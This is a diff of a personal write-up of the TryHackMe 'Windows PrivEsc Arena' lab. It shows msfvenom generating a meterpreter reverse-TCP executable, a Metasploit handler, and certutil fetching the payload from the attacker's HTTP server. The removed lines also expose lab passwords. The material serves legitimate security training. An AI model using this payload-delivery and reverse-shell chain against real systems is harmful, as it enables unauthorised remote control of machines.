@@ -1,19 +1,24 @@
-<h1 align="center">Network Security Essentials</h1>
-<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/fdddadf5-8341-4055-90e8-810fa78316f5"><br>
-2025, September 25<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
+<h1 align="center"Windows PrivEsc Arena</h1>
+<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/2aa90eb0-ddef-4a78-bd1e-35f113e0c47a"><br>
+2025, September 28<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
 and I’m excited to join you on this adventure, part of my <code>510</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
-<em>Learn about key aspects of network security essentials and how to monitor and protect against adversaries</em>.<br>
-Access it <a href="https://tryhackme.com/room/networksecurityessentials">here</a>.<br>
-<img width="1200px" src="https://github.com/user-attachments/assets/6eb54ea1-8481-4b05-99e2-a7d7453f78b3"></p>
+<em>Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open. Your credentials are user:***********</em>.<br>
+Access it <a href="https://tryhackme.com/room/windowsprivescarena">here</a>.<br>
+<img width="1200px" src=""></p>
+
+
 
 <h2 align="center">Task 1 . Connecting to TryHackMe network</h2>
-<br>
+<p>To complete this room and access the vulnerable Windows machine, you need to first connect to TryHackMe's VPN. If you've not done this before, first complete the OpenVPN room and learn how to connect.</p>
 
 <p><em>Answer the question below</em></p>
 
 <p>1.1.Connect to TryHackMe´s VPN..<br>
 <code>No answer needed</code></p>
 
+
+
+<br>
 <h2 align="center">Task 2 . Deploy the vulnerable machine</h2>
 <p>This room will teach you a variety of Windows privilege escalation tactics, including kernel exploits, DLL hijacking, service exploits, registry exploits, and more. This lab was built utilizing Sagi Shahar's privesc workshop (https://github.com/sagishahar/lpeworkshop) and utilized as part of The Cyber Mentor's Windows Privilege Escalation Udemy course (http://udemy.com/course/windows-privilege-escalation-for-beginners).<br>
 
@@ -28,30 +33,26 @@ For any administrative actions you might take, your credentials are:<br>
 
 username: TCM<br>
 password: *********</p>
-<br>
 
 <p><em>Answer the questions below</em></p>
 
 <p>2.1. Deploy the machine and log into the user account via RDP.<br>
 <code>No answer needed</code></p>
 
-
 ```bash
 apt install rdesktop
 ```
 
-
 ```bash
-rdesktop -u user -p "password321" 10.201.56.185 -g 90%
+rdesktop -u user -p "***********" xx.xxx.xx.xxx -g 90%
 ```
-
-<br>
-<br>
 
 <p>2.2. Open a command prompt and run 'net user'. Who is the other non-default user on the machine?<br>
 <code>tcp</code></p>
 
 <img width="963" height="163" alt="image" src="https://github.com/user-attachments/assets/724c1cdf-c46d-48d9-ab1c-ee8b0e09bf64" />
+
+
 
 
 <br>
@@ -104,7 +105,6 @@ C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
 C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
 ```
 
-
 <img width="1150" height="530" alt="image" src="https://github.com/user-attachments/assets/951f1867-2488-4935-b7e8-c69b6d7594b6" />
 
 <br>
@@ -142,20 +142,20 @@ payload => windows/meterpreter/reverse_tcp
 ```
 
 ```bash
-msf6 exploit(multi/handler) > set LHOST 10.201.113.77
-LHOST => 10.201.113.77
+msf6 exploit(multi/handler) > set LHOST xx.xxx.xxx.xx
+LHOST => xx.xxx.xxx.xx
 ```
 
 ```bash
 msf6 exploit(multi/handler) > run
-[*] Started reverse TCP handler on 10.201.113.77:4444
+[*] Started reverse TCP handler on xx.xxx.xxx.xx:4444
 ```
 
 <img width="1289" height="651" alt="image" src="https://github.com/user-attachments/assets/fc173d13-1141-444f-b8a9-7190e6e5a61b" />
 
 
 ```bash
-:~/WindowsPrivEscArena# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.201.113.77 LPORT=9001 -f exe -o program.exe
+:~/WindowsPrivEscArena# msfvenom -p windows/meterpreter/reverse_tcp LHOST=xx.xxx.xxx.xx LPORT=9001 -f exe -o program.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
@@ -164,7 +164,6 @@ Final size of exe file: 73802 bytes
 Saved as: program.exe
 ```
 
-
 <img width="580" height="85" alt="image" src="https://github.com/user-attachments/assets/9f059262-6490-4048-aa6d-4fb1239b3638" />
 
 <br>
@@ -172,7 +171,7 @@ Saved as: program.exe
 <br>
 
 ```bash
-:~/WindowsPrivEscArena# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.201.113.77 -f exe -o program.exe
+:~/WindowsPrivEscArena# msfvenom -p windows/meterpreter/reverse_tcp lhost=xx.xxx.xxx.xx -f exe -o program.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
@@ -195,7 +194,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 <br>
 
 ```bash
-PS C:\Users\user> certutil.exe -urlcache -f http://10.201.113.77:8000/program.exe program.exe
+PS C:\Users\user> certutil.exe -urlcache -f http:/xx.xxx.xxx.xx:8000/program.exe program.exe
 ```
 
 <img width="988" height="110" alt="image" src="https://github.com/user-attachments/assets/8f23fcf8-a235-4494-8e6c-141c94326451" />
@@ -207,11 +206,11 @@ PS C:\Users\user> certutil.exe -urlcache -f http://10.201.113.77:8000/program.ex
 ```bash
 :~/WindowsPrivEscArena# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.201.56.185 - - [28/Sep/2025 21:05:17] "GET /program.exe HTTP/1.1" 200 -
+xx.xxx.xx.xxx - - [28/Sep/2025 21:05:17] "GET /program.exe HTTP/1.1" 200 -
 ```
 
 ```bash
-:~/WindowsPrivEscArena# rdesktop -u TCM -p "Hacker123" 10.201.56.185 -g 80%
+:~/WindowsPrivEscArena# rdesktop -u TCM -p "*********" xx.xxx.xx.xxx -g 80%
 ```
 
 <img width="1453" height="623" alt="image" src="https://github.com/user-attachments/assets/67ae340f-d63c-474f-8723-1d20ca3a5ba8" />
